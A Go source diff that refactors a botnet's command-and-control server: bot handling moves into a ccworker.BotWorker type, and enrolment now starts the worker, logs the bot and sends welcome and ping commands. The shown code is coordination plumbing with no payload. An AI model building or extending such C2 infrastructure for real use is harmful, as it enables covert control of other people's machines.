@@ -4,6 +4,7 @@ import (
 	"crypto/rsa"
 	"log"
 
+	"github.com/adrianosela/botnet/command-and-control/ccworker"
 	"github.com/adrianosela/botnet/lib/encryption"
 	"github.com/adrianosela/botnet/lib/protocol"
 )
@@ -13,7 +14,7 @@ type CommandAndControl struct {
 	ServerKey     string
 	msgDecryptKey *rsa.PrivateKey
 	recvMsgChan   chan *protocol.Message // Channel for receiving de-crypted messages requests
-	bots          map[string]*BotCtrl
+	bots          map[string]*ccworker.BotWorker
 }
 
 // NewCmdAndCtrl is the constructor for a CommandAndControl
@@ -27,7 +28,7 @@ func NewCmdAndCtrl() (*CommandAndControl, error) {
 		msgDecryptKey: priv,
 		ServerKey:     string(pub),
 		recvMsgChan:   make(chan *protocol.Message),
-		bots:          make(map[string]*BotCtrl),
+		bots:          make(map[string]*ccworker.BotWorker),
 	}, nil
 }
 
@@ -42,11 +43,10 @@ func (cc *CommandAndControl) StartBotnet() {
 }
 
 // EnrolBot registers a bot to the botnet
-func (cc *CommandAndControl) EnrolBot(bot *BotCtrl) {
-	cc.bots[bot.id] = bot
-	go bot.writer()
-	go bot.reader()
-	log.Printf("[%s] joined net", bot.id)
+func (cc *CommandAndControl) EnrolBot(bot *ccworker.BotWorker) {
+	cc.bots[bot.ID] = bot
+	bot.Start()
+	log.Printf("[%s] joined net", bot.ID)
 	// let bot know enrolment succeeded
 	bot.CommandChan <- &protocol.Command{Type: protocol.CommandTypeWelcome}
 	bot.CommandChan <- &protocol.Command{Type: protocol.CommandTypePing}
